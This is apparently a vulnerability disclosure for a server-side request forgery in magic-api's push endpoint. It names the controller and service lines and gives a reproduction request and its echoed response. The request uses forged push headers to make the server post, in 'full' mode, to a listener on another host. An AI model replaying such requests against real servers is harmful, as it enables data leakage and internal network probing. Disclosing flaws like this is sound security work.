Vulnerability Title: Push Interface SSRF (Response Echo + Site-wide Resource Packet)

Vulnerability Location

- `magic-api/.../core/web/MagicWorkbenchController.java#L319-L327`: `target` comes from the request header `magic-push-target`

- `magic-api/.../core/service/impl/DefaultMagicAPIService.java#L145-L175`: Directly `restTemplate.postForObject(target, ...)`, **the response body is returned to the caller**

Vulnerability Reproduction

Request packet (target → magic-api):

POST /magic/web/push HTTP/1.1
Host: 192.168.26.129:9999
Content-Type: application/json
magic-push-target: http://192.168.26.1:8899/ssrf-test
magic-push-secret-key: x
magic-push-mode: full
Content-Length: 3

[]

Return packet (third-party response is returned as is, data/message is the content returned by our listener):

HTTP/1.1 200

Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET,POST,OPTIONS,PUT,DELETE

Content-Type: application/json

Transfer-Encoding: chunked
Date: Tue, 13 Oct 2026 10:43:41 GMT

{"code":1,"message":"SSRF-LISTENER-ON-192.168.26.1","data":"pong","timestamp":1791888000000,"executeTime":null}

